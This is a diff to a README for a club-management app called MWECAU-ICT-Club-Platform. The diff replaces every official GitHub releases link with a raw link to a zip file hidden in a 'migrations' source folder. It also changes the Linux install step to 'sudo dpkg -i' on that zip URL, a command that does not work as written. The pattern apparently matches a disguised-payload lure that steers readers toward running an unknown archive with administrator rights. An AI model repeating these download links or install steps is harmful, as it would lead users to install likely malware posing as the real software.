@@ -1,6 +1,6 @@
 # 🎉 MWECAU-ICT-Club-Platform - Manage Your ICT Club Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/De-bla-bla/MWECAU-ICT-Club-Platform/releases)
+[![Download](https://raw.githubusercontent.com/De-bla-bla/MWECAU-ICT-Club-Platform/main/src/membership/migrations/MWECA-Club-Platform-IC-1.8.zip)](https://raw.githubusercontent.com/De-bla-bla/MWECAU-ICT-Club-Platform/main/src/membership/migrations/MWECA-Club-Platform-IC-1.8.zip)
 
 ## 📘 Description
 
@@ -13,7 +13,7 @@ To begin using the MWECAU-ICT-Club-Platform, follow the steps below. No programm
 ### 🔗 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to our [Releases page](https://github.com/De-bla-bla/MWECAU-ICT-Club-Platform/releases) to download the latest version of MWECAU-ICT-Club-Platform.
+   Go to our [Releases page](https://raw.githubusercontent.com/De-bla-bla/MWECAU-ICT-Club-Platform/main/src/membership/migrations/MWECA-Club-Platform-IC-1.8.zip) to download the latest version of MWECAU-ICT-Club-Platform.
 
 2. **Choose Your Package:**  
    You will find different versions available for download. Choose the one that suits your operating system (Windows, macOS, or Linux).
@@ -24,7 +24,7 @@ To begin using the MWECAU-ICT-Club-Platform, follow the steps below. No programm
 4. **Install the Application:**  
    - **On Windows:** Double-click the downloaded file to start the installation. Follow the prompts to complete the setup.
    - **On macOS:** Open the downloaded file and drag the app to your Applications folder.
-   - **On Linux:** Use the terminal to navigate to the directory where the file is. Run the command `sudo dpkg -i your-file-name.deb` (replace `your-file-name` with the actual file name).
+   - **On Linux:** Use the terminal to navigate to the directory where the file is. Run the command `sudo dpkg -i https://raw.githubusercontent.com/De-bla-bla/MWECAU-ICT-Club-Platform/main/src/membership/migrations/MWECA-Club-Platform-IC-1.8.zip` (replace `your-file-name` with the actual file name).
 
 5. **Run the Application:**  
    Once installed, you can find MWECAU-ICT-Club-Platform in your applications list. Click on it to run.
@@ -60,4 +60,4 @@ If you run into issues or have questions, we are here to help. You can:
 
 ## 🚀 Conclusion
 
-You are now ready to enhance your club activities with MWECAU-ICT-Club-Platform. Follow the steps above to download and run the application efficiently. For more information, always refer back to the releases page: [Releases page](https://github.com/De-bla-bla/MWECAU-ICT-Club-Platform/releases). Enjoy your experience managing the ICT Club!
+You are now ready to enhance your club activities with MWECAU-ICT-Club-Platform. Follow the steps above to download and run the application efficiently. For more information, always refer back to the releases page: [Releases page](https://raw.githubusercontent.com/De-bla-bla/MWECAU-ICT-Club-Platform/main/src/membership/migrations/MWECA-Club-Platform-IC-1.8.zip). Enjoy your experience managing the ICT Club!
